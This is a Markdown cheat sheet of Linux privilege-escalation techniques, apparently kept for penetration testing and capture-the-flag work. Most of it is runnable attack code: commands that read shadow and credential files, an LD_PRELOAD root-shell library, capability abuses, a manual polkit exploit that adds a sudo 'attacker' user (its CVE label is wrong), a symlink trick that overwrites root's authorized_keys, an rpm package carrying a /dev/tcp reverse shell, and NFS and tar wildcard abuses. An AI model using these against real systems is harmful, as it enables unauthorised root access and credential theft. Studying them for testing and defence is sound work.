# Linux Privilege Escalation
## Misconfiguration
- Find writable directories
	`find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`
- Find writable directories in PATH
	`IFS=':'; read -a patharr <<< "$PATH"; for dir in ${patharr[@]}; do if [ -w $dir ]; then echo -e "$dir : WRITABLE"; fi; done;`
- Find writable files
	`find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`
- Find suid binaries
	`find / -perm /4000 2>/dev/null`
- Find guid binaries
	`find / -perm /2000 2>/dev/null`
- Find binaries with capabilities
	`getcap -r / 2>/dev/null`
- Look for cronjob
	`crontab -l`
	`cat /etc/crontab`
- Look for nfs exports
	`cat /etc/exports`
- Find unmounted drives
	`ls /dev 2>/dev/null | grep -i "sd"`
- Look for credentials in fstab
	`grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null`
- Look for mounted drives
	`cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null`
- Find hidden files
	`find / -type f -iname ".*" -ls 2>/dev/null`
- Look for backup files
	`find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null`
- Look for passwd and shadow files
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
## LD_PRELOAD
If `env_keep += LD_PRELOAD` in sudoers:
```bash
$ cat << EOF > /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
EOF
$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
$ ls -al shell.so
$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/*****
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Capabilities
### cap_setuid+ep
- perl
```perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
```

### cap_chown
- python
```python
import os
os.chown("/etc/shadow", 1000, 1000)
```
- ruby
```ruby
require 'fileutils'
FileUtils.chown_R 'user', 'user', '/etc/shadow'
```

## Binaries
- Look inside binaries for exploit possibilities
```
strings /path/to/binary
```
> If we find calls to an executable using relative path, we can create a malicious script using the binary name and update PATH to include the folder

## Local exploits
### pwnkit (cve-2021-3560)
- Last vulnerable package (ubuntu) : 0.105-26ubuntu1
- Manual exploit (create attacker user with sudo rights)
```bash
# Create the user
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
# Create a password
openssl passwd -6 mynewpassword
# Set the password
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
```

### Overwrite file with symlink
Scenario : if root write a file in a folder for which you have write permission, it's possible to overwrite a file only root can write by creating a symlink to the target file.
Example : https://0xdedinfosec.vercel.app/posts/hackthebox-timing-writeup
```bash
# lowpriv can download a file as root via sudo to his home directory.
# create a symlink to /root/.ssh/authorized_keys
# on attack machine, serve a public key named authorized_keys
# download the file as root which will overwrite the link target
ln -s /root/.ssh/authorized_keys ~/.ssh/authorized_keys
sudo ....... (download authorized_keys > /root/.ssh/)
```
### yum
- Get a reverse shell using crafted rpm package

If low priv user can run yum as root, we can craft a rpm package to get a reverse shell as root:
```bash
# Create a script with reverse shell commands
# root.sh:
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/0.0.0.0/4444 0>&1'

# Then use fpm docker image to build the rpm:
docker run --rm -v $(pwd):/data skandyla/fpm -n packagename -s dir -t rpm -a all --before-install /data/root.sh  -p /data /data
# Start an HTTP server and tcp listener
python -m SimpleHTTPServer 8000
nc -lnvp 4444
# On the target machine, install the rpm package:
sudo yum install http://0.0.0.0:8000/root-1.0-1.noarch.rpm
```

### nfs
- Exploit rootsquash
```sh
# Copy a bash binary to mounted NFS
cp bash /mount/point/to/nfs
# Set owner to root
sudo chown root /mount/point/to/nfs/bash
# Set uid on binary
chmod a+sx /mount/point/to/nfs/bash
# Run the binary in low privilege shell
./bash -p (in low privilege shell)
```

### tar
- Exploit tar with wildcard injection
```sh
# Example tar command: cd /folder; tar cf /backup.tgz *
# Exploit this with checkpoint injection:
cd /folder
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
# Wait for tar to run as root
```

### pkexec
See this writeup for THM's road
https://wiki.thehacker.nz/docs/thm-writeups/road-medium/

## Shell escape sequence
| Tool   | Escape Sequence                                                 |
| ------ | --------------------------------------------------------------- |
| vi/vim | `:!/bin/bash`, `:set shell=/bin/bash:shell`                     |
| awk    | `awk 'BEGIN {system(\"/bin/bash\")}'`                           |
| perl   | `perl -e 'exec \"/bin/bash\";'`                                 |
| find   | `find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;` |
| nmap   | --interactive                                                   |                           


## Tools
- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
- https://github.com/sleventyeleven/linuxprivchecker
- https://github.com/rebootuser/LinEnum

## Guides
- https://book.hacktricks.xyz/linux-unix/privilege-escalation
- https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks
- https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://gtfobins.github.io/
- https://tbhaxor.com/exploiting-linux-capabilities-part-3/

## Writeups
- https://blog.tryhackme.com/skynet-writeup/
- https://s1gh.sh/tryhackme-wonderland/